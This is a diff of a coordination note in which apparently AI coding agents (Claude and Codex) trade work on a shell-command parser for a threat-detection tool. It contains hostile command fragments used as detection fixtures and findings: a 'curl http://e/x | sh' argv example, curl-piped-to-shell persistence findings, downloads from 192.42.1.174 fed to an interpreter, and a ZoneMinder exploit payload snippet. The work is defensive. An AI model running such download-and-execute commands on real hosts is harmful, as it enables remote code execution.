@@ -1,202 +1,52 @@
-# 2026-10-18 20:17 EDT · Codex → Claude: Shell allow-list results
 
-## Outcome
+# 2026-10-18 20:43 EDT · Claude → Codex: FINAL M1 PARSER ROUND. Execute only; no planning step.
 
-The shell allow-list round is complete. I replaced the permissive parser, propagated uncertain shell-script extraction into the coverage ledger, removed parse failure as a suspicious web-interpreter indicator, added the full adversarial matrix, ran the complete local verification, deployed a clean commit, and ran the requested model-off lab hunt.
+**Gate result on your allow-list round:** every earlier reproduction is fixed. The reviewer then found new inputs where the allow-list accepts a script but reads it differently from bash. Rather than keep hardening, **the owner decided (option 2) that script-text rules are positive-only indicators.** Claude implemented that in `9120190`:
+- `Playbook.assures_negative`
+- coverage state `positive_only`, shown as "not assessable by design"
+- claim type `script_content`, worded as "a shell started with a script that contains…"
+- `host.exec_from_temp_dir` counts an unknown `-c` layout as unevaluable
 
-No detection-policy lane, decision-policy rule, or read-only source allowlist was changed. I did not read `/home/user/romulus-eval/` and did not touch v1.
+Claude also fixed F8 (aggregate consume-time matches counted as complete negatives) in `3f18b3a`. Live model-off hunt `h20261019-004146-c4d1e9` is `completed_within_scope`, with 0 errors, 0 broken citations, and 7 urgent findings including both process-level `curl … | sh` persistence findings.
 
-## Commits
+So the parser gaps the reviewer found (newline after `|`, `time`, `NAME+=`, `0<`, `+e`, wrappers like `nohup`/`sudo`) can no longer produce a false complete negative. They can only cost a script-text *lead*. Don't harden them further in this round. **Implement only the items below, test-first, one commit each, in order. No plan or approval request.**
 
-1. `2620d68 fix(evidence): replace shell parser with allow-list lexer`
-2. `d43877f fix(detect): propagate unknown shell evaluation`
-3. `65593a9 docs: record shell allow-list handoff` — committed your incoming task note so the lab deployment had a clean, exact stamp.
-4. `beedaaf docs: record shell allow-list verification` — updated project status and milestone evidence after the live run. This documentation-only commit was made after the tested deployment.
+### 1 (F6, the parser half): `shell_script_of` / `_has_c_option` scans past the script file
+`["bash", "/tmp/x.sh", "-c"]` and `["bash", "/tmp/x.sh", "-recursive"]` are treated as `-c` layouts (unknown), so `host.exec_from_temp_dir` can't see a script run from `/tmp`. Bash stops option parsing at the first non-option argument.
 
-The commit containing this replacement handoff file follows `beedaaf` on `codex/model-investigator`.
+**Done when:** option scanning stops at the first non-option argument (as bash does); both argvs above return `None`, so the temp-dir rule matches `/tmp/x.sh`; and `bash -c -- S`, `bash -o pipefail -c S`, `bash -c +e S`, `sh -c +e S` and `bash -lc +e S` return `UnknownShellScript`. Treat a script argument starting with `+` or `-` as unknown.
 
-## Implementation details
+### 2 (F7): login-shell `argv[0]` isn't recognised as a shell
+`["-bash", "-c", "curl http://e/x | sh"]` (as `su - user -c` and `sudo -i` produce) is treated as "no script".
 
-### 1. One-pass allow-list lexer
+**Done when:** one leading `-` is stripped from `argv[0]` before the shell lookup, and fixtures cover `-bash` and `-sh`.
 
-`src/romulus/evidence/shellparse.py` no longer uses `shlex` plus independent heredoc/substitution pre-scanners. `_lex()` is one state machine that tracks:
+### 3 (F12, minor): non-POSIX shells
+`SHELLS` includes `zsh` and `ksh`, but the lexer models bash/POSIX.
 
-- unquoted, single-quoted, and double-quoted input;
-- word boundaries;
-- backslash escapes;
-- comments; and
-- operators and redirects.
+**Done when:** `shell_script_of` returns `UnknownShellScript` for zsh, ksh, fish and csh-family `-c` scripts.
 
-It models only plain words, supported quoting/escaping, comments, `|`, `||`, `&&`, `;`, `&`, newline, `>`, `>>`, `<`, and directly attached `2>`/`2>>`. A spaced digit remains an argv word: `echo key 2 > file` parses argv `['echo', 'key', '2']` plus redirect `('>', 'file')`.
+### 4 (Important, recovers a real finding): prefix indicators for the web-service rule
+Since `$` became unmodelled, the ZoneMinder exploit payload (`sh -c /usr/bin/zmu -A -a -m ;echo … | exec $(which python…)`, the attacker's initial access at 14:23:12) dropped from high to lead. Its "additional commands chained after application helper" indicator sits in the part of the script *before* the first unmodelled construct. A positive on partial evidence is allowed.
 
-The same lexer fails closed with `ParsedScript.ok=False` and a reason for ANSI-C quotes, every active dollar expansion, command/process substitution, heredocs/here-strings, parentheses/braces, reserved command words, assignment prefixes, dynamic wrappers (`eval`, `exec`, `command`, `env`, `builtin`), backslash-newline, unsupported redirect forms, glob expansion, invalid double-quote escapes, and non-ASCII unquoted whitespace.
+**Done when:**
+- The lexer can return the cleanly lexed prefix up to the first unmodelled construct, flagged as partial.
+- `interpreter_indicators` evaluates indicators over that prefix only, and records in the match note that the script was only partially modelled.
+- The lab payload event is `high` again.
+- A test proves a prefix that ends in an unclosed construct can't produce a chaining indicator from text after the cut.
+- This feeds only positives. It never changes `positive_only` coverage, and never makes a cell complete.
 
-`#` starts a comment only when no word is in progress. Therefore it starts a comment at the script start or after an unescaped ASCII blank/newline/operator, but remains literal after quoted or escaped input and inside a word. Comment contents cannot mutate quote state or hide unsupported syntax on later lines.
+### 5 (F13, test strength)
+`tests/test_sweep.py:262` (`assert states != {"no_match_complete"}`) passes even when one rule is falsely complete. **Done when:** each relevant rule's cell is asserted separately.
 
-### 2. Explicit unknown shell-script extraction
+### Rules
+- Don't change decision-policy lanes, the read-only allowlist, or Claude's `assures_negative` / `positive_only` semantics.
+- Don't undo `7d019b9`, `2663e1d`, `b332dac`, `a74c5f3`, `05aba63`, `3f18b3a` or `9120190`.
+- Never read `/home/user/romulus-eval/` or touch v1.
 
-`shell_script_of()` now returns `str | UnknownShellScript | None`:
-
-- `str`: only a certainly located direct `shell -c SCRIPT` or `shell -lc SCRIPT`;
-- `UnknownShellScript`: the argv contains a `-c` request but the script position is not safely modelled; and
-- `None`: the argv definitively has no direct shell script to inspect.
-
-The required ambiguous forms all return explicit unknown: `bash -c -- S`, `bash -c -x S`, `bash -o pipefail -c S`, and `busybox sh -c S`. A missing script after `-c` is also unknown.
-
-### 3. Detector and coverage behavior
-
-`src/romulus/detect/host.py` now treats both an explicit unknown layout and a parser rejection as unevaluable:
-
-- `host.download_piped_to_shell` increments `missing_required` and returns no match;
-- `host.ssh_authorized_keys_write` increments `missing_required` and returns no match; and
-- `host.web_service_spawns_interpreter` increments `missing_required` for its indicator check, does not add a parse-failure indicator, and still retains the event in its ordinary stack/rarity path.
-
-This reuses the existing sweep rule-cell behavior: a `missing_required` delta persists `evaluated_partial`, so unsupported input cannot become `no_match_complete`. An unmodelled script is not treated as suspicious. A rare web-service command remains a lead without gaining a high-lane indicator.
-
-### 4. Test coverage added
-
-`tests/test_evidence.py` covers the exact allow-list grammar, all prohibited constructs, comment/quote/escape boundaries, redirect attachment semantics, literal single-quoted metacharacters, and explicit unknown argv layouts.
-
-`tests/test_playbooks.py` proves ambiguous layouts are unevaluable for both direct shell rules; unmodelled syntax is not a web-service indicator; the web aggregate still produces its rarity lead; and every required simple positive remains intact.
-
-`tests/test_sweep.py` exercises persisted rule cells for every supplied hostile class. The required heredoc, substitution, comment-boundary, and ANSI-C false-positive cases produce no shell-rule candidate and persist both direct shell rules as `evaluated_partial`. The second adversarial group can only persist partial coverage or an exact match when its syntax is genuinely modelled; it cannot persist a complete negative for both shell rules.
-
-## Files changed
-
-- `src/romulus/evidence/shellparse.py`
-- `src/romulus/detect/host.py`
-- `tests/test_evidence.py`
-- `tests/test_playbooks.py`
-- `tests/test_sweep.py`
-- `docs/project/STATUS.md`
-- `docs/project/MILESTONES.md`
-- `Claude-Codex.md`
-
-No architecture layer rule changed, so `docs/architecture/ARCHITECTURE.md` did not require modification.
-
-## Local verification
-
-Focused parser/playbook verification after implementation:
-
-```text
-.\.venv\Scripts\python -m pytest -q -p no:warnings tests/test_evidence.py tests/test_playbooks.py
-........................................................................ [ 49%]
-........................................................................ [ 98%]
-..                                                                       [100%]
-```
-
-Expanded evidence/playbook/sweep files:
-
-```text
-.\.venv\Scripts\python -m pytest -q -p no:warnings tests/test_evidence.py tests/test_playbooks.py tests/test_sweep.py
-........................................................................ [ 36%]
-........................................................................ [ 72%]
-........................................................                 [100%]
-```
-
-Exact full-suite command required by the project:
-
-```text
-.\.venv\Scripts\python -m pytest -q -p no:warnings
-........................................................................ [ 22%]
-........................................................................ [ 44%]
-........................................................................ [ 66%]
-........................................................................ [ 88%]
-.....................................                                    [100%]
-```
-
-Exit code was 0. A separate collection pass reported:
-
-```text
-325 tests collected in 0.39s
-```
-
-Architecture gate:
-
-```text
-.\.venv\Scripts\python scripts/archmap.py --check
-```
-
-Exit code was 0 with no output.
-
-## Deployment and live model-off hunt
-
-Clean deployment command and real output:
-
-```text
-powershell -File scripts/deploy.ps1 -SkipInstall
-deployed commit 65593a9: Claude-Codex.md CLAUDE.md DEPLOYED_COMMIT docs ENGINEERING_MASTER_PROMPT.md pyproject.toml scripts src tests
-```
-
-`cat /home/user/romulus-v2/app/DEPLOYED_COMMIT` returned `65593a9`, exactly matching local `HEAD` at deployment time.
-
-Hunt command:
-
-```text
-/home/user/romulus-v2/venv/bin/romulus --env-file /home/user/romulus-v2/.env hunt start \
-  --start 2024-11-18T10:00:00Z --end 2024-11-18T17:30:00Z --no-agent
-```
-
-Real completion tail:
-
-```text
-hunt h20261019-001401-d6328f created [2024-11-18T10:00:00+00:00, 2024-11-18T17:30:00+00:00)
-done: completed_within_scope reportable_findings lanes={'context': 504, 'high': 10, 'lead': 80, 'urgent': 7} stats={'partitions': 19, 'records': 1791438, 'events': 296500, 'candidates': 601, 'errors': 0}
-```
-
-Persisted status and report output:
-
-```text
-h20261019-001401-d6328f  completed_within_scope   reportable_findings                      lanes={'context': 504, 'high': 10, 'lead': 80, 'urgent': 7} agent=disabled unworked=97 partial_pivots=0 analyst_flags=0
-revision 1: 97 findings/leads, broken citations=0
-  /home/user/romulus-v2/reports/h20261019-001401-d6328f/h20261019-001401-d6328f-r1.json
-  /home/user/romulus-v2/reports/h20261019-001401-d6328f/h20261019-001401-d6328f-r1.md
-```
-
-Manifest integrity was:
-
-```json
-{
-  "broken_citations": 0,
-  "broken_investigation_citations": 0,
-  "broken_investigation_event_ids": [],
-  "finalizable": true
-}
-```
-
-Both requested shell-rule coverage claims are unresolved rather than false negatives:
-
-```json
-{
-  "rule_id": "host.download_piped_to_shell",
-  "negative_claim": "unresolved: partial, failed or unexecuted partitions evaluated_partial=17",
-  "records_evaluated": 102457,
-  "states": {"evaluated_partial": 17, "not_applicable_no_events": 2}
-}
-{
-  "rule_id": "host.ssh_authorized_keys_write",
-  "negative_claim": "unresolved: partial, failed or unexecuted partitions evaluated_partial=17",
-  "records_evaluated": 102457,
-  "states": {"evaluated_partial": 17, "not_applicable_no_events": 2}
-}
-```
-
-The two mandatory process-level urgent findings remain:
-
-- `host.downloader_feeds_interpreter` for `http://192.42.1.174/TODO.md`, 8 paired occurrences, 48 retained citations.
-- `host.downloader_feeds_interpreter` for `http://192.42.1.174/README.txt.1`, one paired occurrence, 6 retained citations.
-
-### Lane-count change explained
-
-The previous baseline was 7 urgent / 11 high / 79 lead / 504 context. The new result is 7 urgent / 10 high / 80 lead / 504 context. Exactly one finding changed lane:
-
-- Prior high item `a42c349ee85f5e29ec22`, `host.web_service_spawns_interpreter`, was a ZoneMinder-shaped `sh -c /usr/bin/zmu ... ; echo ... | exec $(which python ...)` event. Its only note was `indicator: shell script could not be parsed (command substitution is not modelled)`.
-- Current item `43c7f7944033c75dab42` is retained as a lead with `rare shape without typed indicators` and a one-occurrence stack count.
-
-That reclassification is the required behavior: command substitution is unmodelled, and parse failure is uncertainty rather than evidence. No urgent finding was lost.
-
-## Spec disagreements and open work
-
-- Spec disagreements: none.
-- Open from this round: no implementation item. Claude should re-run the core gate.
-- I ran the requested model-off lab hunt only; I did not claim a new live model-enabled integration run.
+### Verify, then hand back
+- Run the full suite and the archmap check.
+- Deploy from PowerShell with `scripts/deploy.ps1 -SkipInstall` and confirm the stamp matches `HEAD`.
+- Run one model-off lab hunt over 2024-11-18T10:00Z–17:30Z. Expected: `completed_within_scope`, 0 errors, 0 broken citations, 7 urgent, and **11 high** (the exploit payload back). Explain any other change.
+- Replace this message with your results (header with date and time).
+- Then stop. Claude will run the final gate.
